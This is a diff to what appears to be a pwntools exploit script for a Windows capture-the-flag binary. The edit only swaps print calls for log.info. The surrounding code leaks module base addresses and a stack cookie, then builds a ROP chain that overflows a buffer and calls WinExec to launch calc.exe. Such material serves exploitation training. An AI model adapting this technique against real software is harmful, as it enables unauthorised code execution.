@@ -28,15 +28,15 @@ data_addr=base_addr + 0x2600
 scanf_addr=base_addr + 0x10
 
 
-print("[+] chall.exe base address : 0x%x"     % base_addr)
-print("[+] ntdll.dll base address : 0x%x"     % ntdll_base)
-print("[+] kernel32.dll base address : 0x%x"  % kernel32_base)
-print("[+] cookie value : 0x%x"               % cookie)
-print("[+] Winexec address : 0x%x"            % winexec_addr)
-print("[+] scanf address : 0x%x"              % scanf_addr)
-print("[+] ret address : 0x%x"                % ret_addr)
+log.info("chall.exe base address : 0x%x"     % base_addr)
+log.info("ntdll.dll base address : 0x%x"     % ntdll_base)
+log.info("kernel32.dll base address : 0x%x"  % kernel32_base)
+log.info("cookie value : 0x%x"               % cookie)
+log.info("Winexec address : 0x%x"            % winexec_addr)
+log.info("scanf address : 0x%x"              % scanf_addr)
+log.info("ret address : 0x%x"                % ret_addr)
 
-print("[+] Build ropchain")
+log.info("Build ropchain")
 
 ropchain="a"*64 + p64(cookie) + "b"*16
 #scanf("%s",data_addr);
@@ -49,8 +49,8 @@ ropchain+=p64(poprcx) + p64(data_addr) # Pop 1st arg
 ropchain+=p64(poprdx) + p64(1) # Pop 2nd arg
 ropchain+=p64(winexec_addr) #  call WinExec
 ropchain+=p64(ret_addr) # Set return address to the real main return value
-print("[+] Trigger overflow...")
+log.info("Trigger overflow...")
 p.sendline(str(600))
 p.sendline(ropchain)
 p.sendline('calc.exe\x00') # for the scanf inside the ropchain
-print("[+] Gimme that calc")
+log.info("Gimme that calc")
